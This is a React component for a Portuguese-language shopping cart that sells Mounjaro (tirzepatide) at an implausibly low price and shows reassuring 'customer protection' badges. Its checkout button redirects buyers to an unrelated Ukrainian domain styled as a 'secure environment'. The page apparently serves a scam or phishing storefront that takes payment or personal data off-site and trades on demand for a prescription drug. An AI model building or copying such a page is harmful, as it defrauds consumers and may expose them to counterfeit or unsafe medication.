import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Minus, Plus, Trash2, Shield, ChevronRight } from "lucide-react";

// Cart images
import emptyCartImg from "@/assets/cart/empty-cart.png";
import prod1Img from "@/assets/cart/prod1.png";

interface CartItem {
  id: string;
  name: string;
  image: string;
  price: number;
  quantity: number;
}

const CartCheckout = () => {
  const navigate = useNavigate();
  const [cartItems, setCartItems] = useState<CartItem[]>([
    { id: "mounjaro", name: "Mounjaro™️ 2,5 mg – Tirzepatida", image: prod1Img, price: 67.90, quantity: 1 }
  ]);

  const formatPrice = (price: number) => {
    return price.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  const updateQuantity = (id: string, delta: number) => {
    setCartItems(items =>
      items.map(item => {
        if (item.id === id) {
          const newQty = Math.max(1, item.quantity + delta);
          return { ...item, quantity: newQty };
        }
        return item;
      })
    );
  };

  const removeItem = (id: string) => {
    setCartItems(items => items.filter(item => item.id !== id));
  };

  const totalItems = cartItems.reduce((sum, item) => sum + item.quantity, 0);
  const subtotal = cartItems.reduce((sum, item) => sum + item.price * item.quantity, 0);

  const handleCheckout = () => {
    window.location.href = "https://ambienteseguro.org.ua/c/2907df25b1";
  };

  return (
    <div className="min-h-dvh flex flex-col bg-muted">
      {/* Header */}
      <header className="sticky top-0 z-10 flex items-center justify-center px-4 py-4 bg-background border-b">
        <button
          onClick={() => navigate(-1)}
          className="absolute left-4 top-1/2 -translate-y-1/2 p-2 hover:bg-muted rounded-lg transition"
          aria-label="Voltar"
        >
          <ArrowLeft className="w-6 h-6" />
        </button>
        <h1 className="text-lg font-bold">Carrinho ({totalItems})</h1>
      </header>

      {/* Content */}
      <div className="flex-1 flex flex-col">
        {cartItems.length === 0 ? (
          /* Empty Cart */
          <div className="flex-1 bg-background px-5 py-10 flex flex-col items-center justify-center">
            <div className="text-center">
              <img src={emptyCartImg} alt="Carrinho vazio" className="w-40 h-auto mx-auto mb-6" />
              <div className="text-xl font-bold text-foreground mb-3">Seu carrinho está vazio</div>
              <div className="text-base text-muted-foreground mb-8">
                Adicione produtos para continuar comprando!
              </div>
              <button
                onClick={() => navigate("/")}
                className="w-full max-w-[300px] bg-primary text-primary-foreground py-4 px-6 rounded-lg font-bold shadow-lg hover:opacity-90 transition"
              >
                Começar a comprar
              </button>
            </div>
          </div>
        ) : (
          /* Cart Items */
          <div className="bg-background">
            {cartItems.map(item => (
              <div key={item.id} className="flex items-center p-4 border-b">
                <div className="w-20 h-20 rounded-lg overflow-hidden mr-3 shrink-0 bg-white">
                  <img src={item.image} alt={item.name} className="w-full h-full object-cover" />
                </div>
                <div className="flex-1">
                  <div className="text-base font-semibold mb-1 line-clamp-2">{item.name}</div>
                  <div className="text-primary font-semibold mb-2">R$ {formatPrice(item.price)}</div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => updateQuantity(item.id, -1)}
                      className="w-7 h-7 rounded-full border flex items-center justify-center text-primary font-bold hover:bg-muted transition"
                    >
                      <Minus className="w-4 h-4" />
                    </button>
                    <span className="min-w-6 text-center font-semibold">{item.quantity}</span>
                    <button
                      onClick={() => updateQuantity(item.id, 1)}
                      className="w-7 h-7 rounded-full border flex items-center justify-center text-primary font-bold hover:bg-muted transition"
                    >
                      <Plus className="w-4 h-4" />
                    </button>
                  </div>
                </div>
                <button
                  onClick={() => removeItem(item.id)}
                  className="text-primary p-2 hover:bg-muted rounded-lg transition"
                  aria-label="Remover item"
                >
                  <Trash2 className="w-5 h-5" />
                </button>
              </div>
            ))}
          </div>
        )}

        {/* Customer Protection */}
        <section className="bg-[#fdf4e9] text-[#8b5e34]">
          <div className="flex items-center justify-between px-3 py-1.5">
            <div className="inline-flex items-center gap-2 font-semibold text-[13px]">
              <Shield className="w-4 h-4" fill="currentColor" />
              Proteção do cliente
            </div>
            <ChevronRight className="w-5 h-5" strokeWidth={1.6} />
          </div>
          <div className="px-3 pb-2 text-[13px] text-[#6b4b2a]">
            <div className="grid grid-cols-2 gap-x-4 gap-y-0.5">
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Devolução gratuita</span>
              </div>
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Reembolso automático por danos</span>
              </div>
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Pagamento seguro</span>
              </div>
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Cupom por atraso na coleta</span>
              </div>
            </div>
          </div>
        </section>

      </div>

      {/* Cart Summary (fixed at bottom when has items) */}
      {cartItems.length > 0 && (
        <div className="sticky bottom-0 bg-background border-t p-4 space-y-3">
          <div className="flex justify-between">
            <span className="text-muted-foreground">Subtotal</span>
            <span>R$ {formatPrice(subtotal)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted-foreground">Frete</span>
            <span className="text-success font-semibold">Grátis</span>
          </div>
          <div className="flex justify-between text-lg font-semibold">
            <span>Total</span>
            <span>R$ {formatPrice(subtotal)}</span>
          </div>
          <button
            onClick={handleCheckout}
            className="w-full bg-primary text-primary-foreground py-4 rounded-lg font-semibold text-base hover:opacity-90 transition"
          >
            Finalizar compra
          </button>
          <button
            onClick={() => navigate("/")}
            className="w-full bg-background text-primary border-2 border-primary py-3.5 rounded-lg font-bold text-base hover:bg-primary hover:text-primary-foreground transition shadow-sm"
          >
            Adicionar mais produtos
          </button>
        </div>
      )}
    </div>
  );
};

export default CartCheckout;
